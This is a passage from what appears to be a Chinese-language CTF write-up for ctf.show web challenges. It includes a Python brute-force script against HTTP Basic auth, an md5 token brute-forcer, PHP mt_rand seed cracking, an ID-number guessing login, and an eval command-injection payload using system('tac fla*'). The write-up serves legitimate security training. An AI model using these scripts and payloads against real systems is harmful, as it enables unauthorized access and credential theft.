class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>故直接<code>POST</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&amp;username=admin</span><br></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>查看源码发现</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkForm</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">        pazzword = <span class="title function_">encrypt</span>(pazzword,key,iv);</span><br><span class="line">        $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>(pazzword);</span><br><span class="line">        $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">data,key,iv</span>) &#123; <span class="comment">//key,iv：16位的字符串</span></span><br><span class="line">        <span class="keyword">var</span> key1  = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(key);</span><br><span class="line">        <span class="keyword">var</span> iv1   = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(iv);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(data, key1,&#123;</span><br><span class="line">            iv : iv1,</span><br><span class="line">            mode : <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">            padding : <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">ZeroPadding</span></span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>故使用<code>AES</code>解密，然后用<code>admin/i_want_a_36d_girl</code>登录</p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>访问<code>/db/db.mdb</code>，使用<code>DbView-v1.1</code>查看，在<code>Switchboard Items</code>中<code>ItemNumber=5</code>的表项中的<code>ItemText</code>中找到<code>flag</code></p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>使用<code>dirsearch</code>发现<code>/backup.sql</code></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>抓包发现头部字段<code>Authorization: Basic YWRtaW46YWRtaW4=</code>，使用题目所给字典爆破</p><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>编写<code>exp</code>如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> passwd <span class="keyword">in</span> f.readlines():</span><br><span class="line">d.append(passwd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">url = <span class="string">&#x27;http://accbdbeb-c52b-44ae-a03e-df483ff243e7.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">payload = base64.b64encode((<span class="string">&#x27;admin:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[i])).encode())</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)),</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">response = requests.post(url=url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="comment"># print(headers[&#x27;Authorization&#x27;])</span></span><br><span class="line"><span class="comment"># flag = re.findall(&#x27;ctfshow&#123;(.*?)&#125;&#x27;,response.text)[0]</span></span><br><span class="line"><span class="comment"># print(&#x27;ctfshow&#123;&#x27; + flag + &#x27;&#125;&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>使用<code>burp</code>的爆破模块</p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>访问<a href="https://vip.ctf.show/%E5%90%8E%E9%BC%A0%E6%A0%87%E7%A7%BB%E5%8A%A8%E5%88%B0%E6%A0%87%E7%AD%BE%E5%A4%84%E5%81%9C%E9%A1%BF%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97%60flag%60">https://vip.ctf.show/后鼠标移动到标签处停顿即可获得`flag`</a></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p>打开得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="comment">// echo $flag;</span></span><br><span class="line">            <span class="comment">// echo &#x27;flag&#123;123&#125;&#x27;;</span></span><br><span class="line">         <span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$i</span>)) <span class="keyword">break</span>;<span class="comment">//422</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/?token=422</code></p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相同的随机数种子，生成随机数对应一致（注意版本一致）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">//第一次是1155388967</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/?r=1155388967</code></p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入<code>r=0</code>可得<code>-1010439643</code>，使用<code>php_mt_seed</code>进行爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pattern: EXACT</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xf8000000 - 0xfbffffff, speed 6820.9 Mseeds/s </span><br><span class="line">seed = 0xfa4317f0 = 4198701040 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">seed = 0xfa4317f1 = 4198701041 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">Found 2, trying 0xfc000000 - 0xffffffff, speed 6819.1 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 2, trying 0x42000000 - 0x43ffffff, speed 57.2 Mseeds/s </span><br><span class="line">seed = 0x430ee585 = 1125049733 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x430ee585 = 1125049733 (PHP 7.1.0+)</span><br><span class="line">Found 4, trying 0x52000000 - 0x53ffffff, speed 56.8 Mseeds/s </span><br><span class="line">seed = 0x5391f6d3 = 1402074835 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x5391f6d3 = 1402074835 (PHP 7.1.0+)</span><br><span class="line">Found 6, trying 0x6e000000 - 0x6fffffff, speed 57.0 Mseeds/s </span><br><span class="line">seed = 0x6e47e308 = 1850204936 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x6e47e308 = 1850204936 (PHP 7.1.0+)</span><br><span class="line">Found 8, trying 0xa6000000 - 0xa7ffffff, speed 57.0 Mseeds/s </span><br><span class="line">seed = 0xa7809666 = 2810222182 (PHP 7.1.0+)</span><br><span class="line">Found 9, trying 0xfe000000 - 0xffffffff, speed 57.1 Mseeds/s </span><br><span class="line">Found 9</span><br></pre></td></tr></table></figure><p>对获得的结果尝试后发现<code>Seed</code>为<code>2810222182</code>，故最终<code>payload</code>为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?r=1010439643</span><br><span class="line">Cookie:</span><br><span class="line">token=750365370</span><br></pre></td></tr></table></figure><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/checkdb.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show/install.php?</span><br><span class="line"></span><br><span class="line"><span class="language-dts">a=<span class="variable">&amp;p</span>=<span class="variable">&amp;d</span>=<span class="variable">&amp;u</span>=<span class="variable">&amp;pass</span>=</span></span><br></pre></td></tr></table></figure><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>下载名单</p><table><thead><tr><th>CTFshow菜鸡学院录取名单</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>序号</td><td>姓名</td><td>专业</td><td>身份证号码</td><td>备注</td></tr><tr><td>1</td><td>高先伊</td><td>WEB</td><td>621022********5237</td><td></td></tr><tr><td>2</td><td>嵇开梦</td><td>MISC</td><td>360730********7653</td><td>党员</td></tr><tr><td>3</td><td>郎康焕</td><td>RE</td><td>522601********8092</td><td></td></tr><tr><td>4</td><td>元羿谆</td><td>PWN</td><td>451023********3419</td><td>生源地贷款</td></tr><tr><td>5</td><td>祁落兴</td><td>CRYPTO</td><td>410927********5570</td><td></td></tr></tbody></table><p>观察后发现缺失出生年月部分，爆破后易知出生年月为<code>19900201</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/info/checkdb.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e12947b8-123f-473f-a946-e55108e2c1d1.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">a=<span class="meta">%</span>E<span class="number">9</span><span class="meta">%</span>AB<span class="meta">%</span><span class="number">98</span><span class="meta">%</span>E<span class="number">5</span><span class="meta">%</span><span class="number">85</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>E<span class="number">4</span><span class="meta">%</span>BC<span class="meta">%</span><span class="number">8</span>A&amp;p=<span class="number">621022199002015237</span></span></span><br></pre></td></tr></table></figure><p>回显，解码后<code>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;0&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>登录即可</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>爆破目录结构即可，最终目录为<code>/72/20</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/72/20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>be394b7f-7bef-4c10-9d1a-02990c1f1e1e.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 03 Sep 2020 13:35:52 GMT</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;5f50f138-14&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>flag</code>，用<code>fla*</code>绕过即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">flag.php index.php</span><br><span class="line"></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla*&#x27;</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ctfshow&#123;6dd0377a-43a4-4bb4-8316-e6733e2a13b3&#125;&#x27;</span>; */ <span class="comment"># @link: https://ctfer.com # @email: h1xa@ctfer.com # @Last Modified time: 2020-09-04 00:14:17 # @Last Modified by: h1xa # @Date: 2020-09-04 00:14:07 # @Author: h1xa # -*- coding: utf-8 -*- /*</span></span><br></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 